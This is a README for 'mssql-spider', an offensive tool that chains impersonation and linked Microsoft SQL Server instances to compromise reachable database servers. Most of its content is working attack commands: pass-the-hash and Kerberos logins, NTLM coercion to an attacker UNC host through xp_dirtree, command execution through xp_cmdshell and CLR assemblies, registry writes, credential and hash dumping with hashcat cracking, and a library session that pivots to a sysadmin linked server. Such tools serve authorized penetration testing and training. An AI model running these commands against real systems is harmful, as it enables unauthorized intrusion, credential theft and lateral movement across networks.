# mssql-spider

![Screenshot](./assets/demo.png)

An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that exploits impersonation and linked instances to discover and compromise as many Microsoft SQL Servers as it can reach.
For example, it can solve the OSEP Lab Challenge 2 automatically.

Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/skahwah/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.

# Setup

a) With [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/mssql-spider.git@main
~~~

b) With [pip](https://github.com/pypa/pip).

~~~ bash
pip install --user git+https://github.com/dadevel/mssql-spider.git@main
~~~

If you want the latest features replace `@main` with `@unstable`.

# Usage

Authenticate as local user and enumerate recursively.

~~~ bash
mssql-spider db01.corp.local -u jdoe -p passw0rd
~~~

Authenticate as domain user via *Pass the Hash* and coerce NTLM authentication from all reachable hosts trough `xp_dirtree`.
This does not require privileged access.

~~~ bash
mssql-spider ./mssql-servers.txt -d corp.local -u jdoe -H b9f917853e3dbf6e6831ecce60725930 --coerce-dirtree '\\attacker.corp.local\test'
~~~

Authenticate via Kerberos and execute a command trough `xp_cmdshell` on all hosts where you can obtain sysadmin privileges.

~~~ bash
export KRB5CCNAME=./jdoe.ccache
mssql-spider db01.corp.local:50123 db02.corp.com:1433 -k -n -x 'whoami /groups'
~~~

Load and execute a .NET assembly with sysadmin privileges.
The first argument is the path to the DLL.
The second argument is the name of the function to call.
All following arguments are passed to the function as `SqlString`.
The C# code for an exemplary DLL can be found at [SharpProcedure.cs](./extras/SharpProcedure.cs).

~~~ bash
mssql-spider db01.corp.local -u jdoe -p passw0rd --exec-clr ./SharpProcedure.dll Run cmd.exe '/c echo %USERNAME%'
~~~

Dump secrets, then crack password hashes of database users with [hashcat](https://github.com/hashcat/hashcat).

~~~ bash
mssql-spider db01.corp.local -u jdoe -p passw0rd --dump-hashes --dump-jobs --dump-autologon
hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
~~~

Detailed help:

~~~
positional arguments:
  HOST[:PORT]|FILE

options:
  -h, --help                                              show this help message and exit
  --depth UINT                                            default: 10
  --threads UINT                                          default: based on CPU cores
  --timeout SECONDS                                       default: 5
  --debug                                                 write verbose log to stderr

authentication:
  -d DOMAIN, --domain DOMAIN                              implies -w
  -u USERNAME, --user USERNAME
  -p PASSWORD, --password PASSWORD
  -n, --no-pass                                           disable password prompt, default: false
  -H [LMHASH:]NTHASH, --hashes [LMHASH:]NTHASH            authenticate via pass the hash
  -a HEXKEY, --aes-key HEXKEY                             authenticate with Kerberos key in hex, implies -k
  -w, --windows-auth                                      use windows instead of local authentication, default: false
  -k, --kerberos                                          authenticate via Kerberos, implies -w, default: false
  -K ADDRESS, --dc-ip ADDRESS                             FQDN or IP address of a domain controller, default: value of -d
  -D NAME, --database NAME

enumeration:
  -q SQL, --query SQL                                     execute SQL statement, unprivileged, repeatable
  --sysinfo                                               retrieve database and OS version, unprivileged

coercion:
  -c UNCPATH, --coerce-dirtree UNCPATH                    coerce NTLM trough xp_dirtree(), unprivileged
  --coerce-fileexist UNCPATH                              coerce NTLM trough xp_fileexist(), unprivileged
  --coerce-openrowset UNCPATH                             coerce NTLM trough openrowset(), privileged

filesystem:
  --file-read REMOTE                                      read file trough openrowset(), privileged
  --file-write LOCAL REMOTE                               write file trough OLE automation, privileged

execution:
  -x COMMAND, --exec-cmdshell COMMAND                     execute command trough xp_cmdshell(), privileged
  --exec-ole COMMAND                                      execute blind command trough OLE automation, privileged
  --exec-job sql|cmd|powershell|jscript|vbscript COMMAND  execute blind command trough agent job, privileged, experimental!
  --exec-clr ASSEMBLY FUNCTION [ARGS ...]                 execute .NET DLL, privileged

registry:
  --reg-read HIVE KEY NAME                                read registry value, privileged, experimental!
  --reg-write HIVE KEY NAME TYPE VALUE                    write registry value, privileged, experimental!
  --reg-delete HIVE KEY NAME                              delete registry value, privileged, experimental!

credentials:
  --dump-hashes                                           extract hashes of database logins, privileged
  --dump-jobs                                             extract source code of agent jobs, privileged
  --dump-autologon                                        extract autologon credentials from registry, privileged
~~~

## Usage as library

~~~
❯ python3
>>> from mssql_spider.client import MSSQLClient
>>> client = MSSQLClient.connect('192.168.118.140', 1433)
>>> client.login(username='webapp11', password='redacted', windows_auth=False)
>>> client.enum_links()
{'SQL11\\SQLEXPRESS': {'local_login': 'NULL', 'remote_login': 'NULL'}, 'SQL27': {'local_login': 'webapp11', 'remote_login': 'webappGroup'}, 'SQL53': {'local_login': 'webapp11', 'remote_login': 'testAccount'}}
>>> linked_instance = client.use_rpc_link('SQL27')
>>> linked_instance.whoami()
{'host': 'sql27', 'login': 'sa', 'user': 'dbo', 'roles': {'db_denydatareader', 'dbcreator', 'db_datareader', 'public', 'db_denydatawriter', 'db_accessadmin', 'setupadmin', 'serveradmin', 'db_backupoperator', 'diskadmin', 'bulkadmin', 'db_owner', 'securityadmin', 'sysadmin', 'db_datawriter', 'processadmin', 'db_ddladmin', 'db_securityadmin'}}
~~~
